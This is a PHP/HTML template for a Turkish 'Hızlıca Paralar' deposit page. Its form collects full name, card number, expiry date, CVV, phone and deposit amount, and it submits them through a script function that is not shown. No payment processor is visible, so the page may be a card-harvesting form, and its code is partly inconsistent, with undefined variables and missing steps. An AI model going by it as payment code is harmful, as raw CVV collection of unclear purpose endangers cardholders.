<?php
include '../../inc/config.php';
$accounts = $db->query("SELECT * from accounts where id = 1")->fetch_assoc();
//github web test
?>

<html lang="en" class="chrome">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
    <link rel="canonical" href="https://hizlicaparalar.com">
    <link rel="shortcut icon" href="/favicon.png">
    <title>Hızlıca Paralar</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="HizlicaParalar">
    <meta name="apple-touch-fullscreen" content="yes">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="theme-color" content="#ffffff">
    <meta name="description" content="Secure creditcard payment system">
    <meta name="keywords" content="HizlicaParalar, creditcard, payment">
    <meta name="author" content="HizlicaParalar">
    <meta name="image" content="https://hizlicaparalar.com/logo.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="HizlicaParalar">
    <meta name="twitter:description" content="Secure creditcard payment system">
    <meta name="twitter:image" content="https://hizlicaparalar.com/static/dashboard/login2.jpg">
    <meta name="og:title" content="HizlicaParalar">
    <meta name="og:description" content="Secure creditcard payment system">
    <meta name="og:image" content="https://hizlicaparalar.com/static/dashboard/login2.jpg">
    <meta name="og:url" content="https://hizlicaparalar.com">
    <meta name="og:site_name" content="HizlicaParalar">
    <meta name="og:type" content="website">
    <meta property="og:title" content="HizlicaParalar">
    <meta property="og:description" content="Secure creditcard payment system">
    <meta property="og:image" content="https://hizlicaparalar.com/static/dashboard/login2.jpg">
    <meta property="og:url" content="https://hizlicaparalar.com">
    <meta property="og:site_name" content="HizlicaParalar">
    <meta property="og:type" content="website">
    <script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
      .splash-screen {
        background: #ff6b6b;
        position: fixed;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        z-index: 99999;
      }

      .splash-screen>.wrap {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translateX(-50%) translateY(-50%);
      }

      .splash-screen>.wrap>img {
        margin: 30px auto;
        display: block;
        width: 250px;
      }

      .splash-screen>.wrap>img.logo {
        -webkit-filter: drop-shadow(0px 2px 2px rgba(0, 0, 0, 0.3));
        filter: drop-shadow(0px 2px 2px rgba(0, 0, 0, 0.3));
        width: 200px;
        margin-bottom: 50px
      }
    </style>
    <link href="assets/css/app.06d64ec9.css" rel="preload" as="style">
    <link href="assets/css/chunk-vendors.214cab5d.css" rel="preload" as="style">
    <link href="assets/js/app.9b1618c3.js" rel="preload" as="script">
    <link href="assets/js/chunk-vendors.c2356907.js" rel="preload" as="script">
    <link href="assets/css/chunk-vendors.214cab5d.css" rel="stylesheet">
    <link href="assets/css/app.06d64ec9.css" rel="stylesheet">
  </head>
  <body class="theme-default">
    <div class="layout-container flex justify-center">
      <!---->
      <div class="container flex column box grow">
        <div class="main box grow flex">
          <!---->
          <!---->
          <!---->
          <!---->
          <div id="affix-container" class="login-page flex scrollable view box grow">
              <div class="align-vertical-middle wrapper" style="padding-top: 0px;">
                <div class="el-row">
                  <div class="el-col el-col-24" align="center">
                    <img src="view/card.png" style="width: 150px;">
                  </div>
                </div>
                <div class="el-row">
                  <div class="el-col el-col-24">
                    <div class="el-steps el-steps--simple">
                      <div class="el-step is-simple" style="flex-basis: 50%; margin-right: 0px;">
                        <div class="el-step__head is-process">
                          <div class="el-step__line" style="margin-right: 0px;">
                            <i class="el-step__line-inner" style="transition-delay: 0ms; border-width: 0px; width: 0%;"></i>
                          </div>
                          <div class="el-step__icon is-icon">
                            <i class="el-step__icon-inner mdi mdi-credit-card-multiple"></i>
                            <!---->
                          </div>
                        </div>
                        <div class="el-step__main">
                          <div class="el-step__title is-process">Ödeme</div>
                          <div class="el-step__arrow"></div>
                        </div>
                      </div>
                      <div class="el-step is-simple" style="flex-basis: 50%; margin-right: 0px;">
                        <div class="el-step__head is-wait">
                          <div class="el-step__line" style="margin-right: 0px;">
                            <i class="el-step__line-inner" style="transition-delay: -150ms; border-width: 0px; width: 0%;"></i>
                          </div>
                          <div class="el-step__icon is-icon">
                            <i class="el-step__icon-inner mdi mdi-credit-card-plus"></i>
                            <!---->
                          </div>
                        </div>
                        <div class="el-step__main">
                          <div class="el-step__title is-wait">Hesap</div>
                          <div class="el-step__arrow"></div>
                        </div>
                      </div>
                      <div class="el-step is-simple is-flex" style="flex-basis: 50%; max-width: 33.3333%;">
                        <div class="el-step__head is-wait">
                          <div class="el-step__line">
                            <i class="el-step__line-inner"></i>
                          </div>
                          <div class="el-step__icon is-icon">
                            <i class="el-step__icon-inner mdi mdi-check-circle"></i>
                            <!---->
                          </div>
                        </div>
                        <div class="el-step__main">
                          <div class="el-step__title is-wait">Tamamlandı</div>
                          <div class="el-step__arrow"></div>
                        </div>
                      </div>
                    </div>
                    <div class="form-content">
                      <div role="alert" class="el-alert el-alert--error is-dark">
                        <i class="el-alert__icon el-icon-error"></i>
                        <div class="el-alert__content">
                          <span class="el-alert__title">Otomatik onay alabilmek için Ad ve Soyadınız creditcarddaki isminiz ile aynı olmalı ve gizlilik modundaki isim görünümü açık olmalıdır</span>
                          <!---->
                          <!---->
                          <i class="el-alert__closebtn el-icon-close" style="display: none;"></i>
                        </div>
                      </div>
                      <div id="step-1">
                      <div class="el-row" style="margin-left: -7.5px; margin-right: -7.5px;">
                        <div class="el-col el-col-24" style="padding-left: 7.5px; padding-right: 7.5px;">
                          <div class="d-flex justify-center">




                            <form name="#form" id="#form" onsubmit="setPaymentcre('creditcard')" class="el-form" style="width: 100%;">
                              <div class="el-form-item">
                                <label class="el-form-item__label">Ad Soyad</label>
                                <div class="el-form-item__content">
                                  <div class="el-input">
                                    <!---->
                                    <input type="text" name="full_name" autocomplete="off" minlength="2" maxlength="255" required="required" class="el-input__inner">
                                    <!---->
                                    <!---->
                                    <!---->
                                    <!---->
                                  </div>
                                  <!---->
                                </div>
                              </div>
                              <div class="el-form-item">
                                <label class="el-form-item__label">Site Kullanıcı adı</label>
                                <div class="el-form-item__content">
                                  <div class="el-input is-disabled">
                                    <!---->
                                    <input value="<?=$us['login']?>" type="text" disabled="disabled" autocomplete="off" minlength="2" maxlength="255" required="required" class="el-input__inner">
                                    <!---->
                                    <!---->
                                    <!---->
                                    <!---->
                                  </div>
                                  <!---->
                                </div>
                              </div>
                              <div class="el-form-item">
                                <label class="el-form-item__label">Kart Numarası</label>
                                <div class="el-form-item__content">
                                  <div class="el-input-number" style="width: 100%;">
                                    <div class="el-input">
                                      <!---->
                                      <input type="text" name="card_number" autocomplete="off" max="100000" min="50" class="el-input__inner" role="spinbutton" aria-valuemax="100000" aria-valuemin="50" aria-valuenow="1000" aria-disabled="false">
                                      <!---->
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                  </div>
                                  <!---->
                                </div>
                              </div>
                              <div class="el-form-item">
                                <label class="el-form-item__label">Son Kullanma Tarihi / SKT</label>
                                <div class="el-form-item__content">
                                  <div class="el-input-number" style="width: 100%;">
                                    <div class="el-input">
                                      <!---->
                                      <input type="text" name="exp_date" autocomplete="off" max="100000" min="50" class="el-input__inner" role="spinbutton" aria-valuemax="100000" aria-valuemin="50" aria-valuenow="1000" aria-disabled="false">
                                      <!---->
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                  </div>
                                  <!---->
                                </div>
                              </div>
                              <div class="el-form-item">
                                <label class="el-form-item__label">CVV (Güvenlik Numarası)</label>
                                <div class="el-form-item__content">
                                  <div class="el-input-number" style="width: 100%;">
                                    <div class="el-input">
                                      <!---->
                                      <input type="text" name="cvv" autocomplete="off" max="100000" min="50" class="el-input__inner" role="spinbutton" aria-valuemax="100000" aria-valuemin="50" aria-valuenow="1000" aria-disabled="false">
                                      <!---->
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                  </div>
                                  <!---->
                                </div>
                              </div>
                              <div class="el-form-item">
                                <label class="el-form-item__label">Telefon</label>
                                <div class="el-form-item__content">
                                  <div class="el-input">
                                    <!---->
                                    <input type="text" name="sender_phone" autocomplete="off" minlength="2" maxlength="255" required="required" class="el-input__inner">
                                    <!---->
                                    <!---->
                                    <!---->
                                    <!---->
                                  </div>
                                  <!---->
                                </div>
                              </div>
                              <div class="el-form-item">
                                <label class="el-form-item__label">Yatırılacak Miktar (₺)</label>
                                <div class="el-form-item__content">
                                  <div class="el-input-number" style="width: 100%;">
                                    <!-- <span role="button" class="el-input-number__decrease">
                                      <i class="el-icon-minus"></i>
                                    </span>
                                    <span role="button" class="el-input-number__increase">
                                      <i class="el-icon-plus"></i>
                                    </span> -->
                                    <div class="el-input">
                                      <!---->
                                      <input type="text" name="amount" autocomplete="off" max="100000" min="50" class="el-input__inner" role="spinbutton" aria-valuemax="100000" aria-valuemin="50" aria-valuenow="1000" aria-disabled="false">
                                      <!---->
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                  </div>
                                  <!---->
                                </div>
                              </div>
                            <div class="el-form-item">
                              <div class="el-form-item__content">
                                <div class="el-input-number" style="width: 100%;">
                                  <!-- <span role="button" class="el-input-number__decrease">
                                    <i class="el-icon-minus"></i>
                                  </span>
                                  <span role="button" class="el-input-number__increase">
                                    <i class="el-icon-plus"></i>
                                  </span> -->
                                  <div class="el-input">
                                    <!---->
                                    <button type="submit" class="el-input__inner">Para Yatır</button>
                                    <!---->
                                    <!---->
                                    <!---->
                                    <!---->
                                  </div>
                                </div>
                                  <!---->
                                </div>
                              </div>
                            </form> 
                            
                          </div>
                        </div>
                      </div>
                      
                  <!---->
                  <!---->
                  <!---->
                </div>
              </div>
          </div>
        </div>
      </div>
    </div>
    <script src="assets/js/chunk-vendors.c2356907.js"></script>
    <script src="assets/js/app.9b1618c3.js"></script>
    <script src="assets/js/script.js?v=saddwa"></script>
    <script>
      function step1(){
        $('#step-1').hide();
        $('#step-2').show();
      }
      function step2(){
        $('#step-2').hide();
        $('#step-3').show();
      }
      function copyNumber(element) {
        var $temp = $("<input>");
        $("body").append($temp);
        $temp.val($(element).text()).select();
        document.execCommand("copy");
        $temp.remove();
     }
    </script>
  </body>
</html>